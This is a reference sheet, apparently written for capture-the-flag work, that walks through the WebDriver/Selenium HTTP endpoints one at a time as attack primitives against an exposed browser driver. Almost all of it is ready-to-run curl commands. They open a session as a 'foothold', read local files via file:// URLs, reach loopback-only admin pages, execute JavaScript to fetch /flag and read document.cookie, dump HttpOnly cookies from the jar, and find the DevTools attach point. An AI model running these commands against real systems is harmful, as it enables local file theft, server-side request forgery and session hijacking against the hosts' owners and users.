# Per-endpoint — the endpoints, one section each

## `POST /session`

The session-create — the foothold.

```bash
curl -s -X POST http://HOST:PORT/session \
  -H 'Content-Type: application/json' \
  -d '{"capabilities":{"alwaysMatch":{"browserName":"chrome"}}}'
```

- **returns**: `{"value":{"sessionId":"...","capabilities":{...}}}`
- **legacy form**: `{"desiredCapabilities":{"browserName":"chrome"}}`
  for pre-W3C drivers/Grids
- **errors**: `session not created` (version/binary/flag), `No matching
  capabilities` (unsatisfiable set), `401` (gated)
- **the foothold**: a `sessionId` = the surface is exposed

## `DELETE /session/{id}`

The destroy — mandatory cleanup.

```bash
curl -s -X DELETE http://HOST:PORT/session/$S
```

Releases the browser process. Always call — a leaked session is a
leaked browser and possibly a held slot on a shared endpoint.

## `POST /session/{id}/url`

The navigate — the file-read and loopback primitive.

```bash
curl -s -X POST .../session/$S/url -d '{"url":"file:///flag"}'
curl -s -X POST .../session/$S/url -d '{"url":"http://localhost/admin"}'
```

- **bound**: returns on `load` per `pageLoadStrategy`
- **pair with**: `GET /source` to read what loaded

## `GET /session/{id}/source`

The DOM/file read — the default read-back.

```bash
curl -s .../session/$S/source
```

The rendered DOM — a `file://` read wrapped in `<html><pre>`, a page's
live tree.

## `POST /session/{id}/execute/sync` and `/async`

The JS read — the richest primitive.

```bash
curl -s -X POST .../session/$S/execute/sync \
  -d '{"script":"return document.cookie","args":[]}'
curl -s -X POST .../session/$S/execute/async \
  -d '{"script":"var d=arguments[0];fetch(\"/flag\").then(r=>r.text()).then(d)","args":[]}'
```

- **sync**: returns the `return` value (JSON-safe)
- **async**: blocks until `arguments[last]` is called — for `fetch`

## `GET /session/{id}/cookies`

The jar read — `HttpOnly` included.

```bash
curl -s .../session/$S/cookies
```

The JS-view restriction does not apply — the jar reads what
`document.cookie` cannot.

## `GET /session/{id}/screenshot`

The rendered read — base64 PNG.

```bash
curl -s .../session/$S/screenshot | python3 -c 'import sys,json,base64;open("s.png","wb").write(base64.b64decode(json.load(sys.stdin)["value"]))'
```

A flag-as-image or a mangled-text flag — the PNG is the artifact.

## `GET /status`

The version read — detection and the version-match.

```bash
curl -s .../status | python3 -m json.tool
```

## `GET /sessions` (non-standard)

The active-session list — the leak detector.

```bash
curl -s .../sessions
```

## `GET /json` (CDP, port 9222)

The target list — the CDP attach point.

```bash
curl -s http://HOST:9222/json | python3 -m json.tool
```

`webSocketDebuggerUrl` per target — attach over ws for the richer API.
